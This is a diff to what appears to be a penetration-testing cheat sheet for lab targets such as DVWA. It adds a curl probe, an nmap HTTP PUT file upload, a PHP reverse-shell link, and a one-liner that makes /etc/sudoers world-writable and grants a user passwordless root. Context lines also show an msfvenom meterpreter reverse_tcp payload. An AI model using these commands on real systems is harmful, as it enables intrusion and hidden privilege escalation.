@@ -79,6 +79,12 @@ find out the ip of the machine in the network
 
 All kind of enumeration topics
 
+*Curl the page*
+
+    curl -v -X Options <ip>
+
+
+
 **Search for Directories**
 
 *dirbuster - with UI*
@@ -700,6 +706,11 @@ on DVWA the page is called via parameter "?page=" enter here the malicious page 
 
 **File Transfer**
 
+*Put with nmap*
+
+    nmap -p 80 10.0.2.11 --script http-put --script-args http-put.url='<target path>',http-put.file='<local path>'
+
+
 *ftp hosting with python*
 
     apt-get install python-pyftpdlib
@@ -916,6 +927,8 @@ https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-i
 
     msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 EXITFUNC=thread -f raw > shell.php
 
+https://github.com/pentestmonkey/php-reverse-shell 
+
 *Meterpreter Session*
 
     ./msfconsole -q
@@ -929,6 +942,18 @@ https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-i
     msf exploit(handler) > run
 
     shell - to get normal shell
+
+*Get file version (Depackage)*
+
+    dpkg -l | grep <file>
+
+*Read exploits from searchsploit*
+
+    /usr/share/exploitdb/exploits/linux/local/...
+
+*add local user to sudoers*
+
+    echo 'chmod 777 /etc/sudoers && echo "<user> ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 
 
 
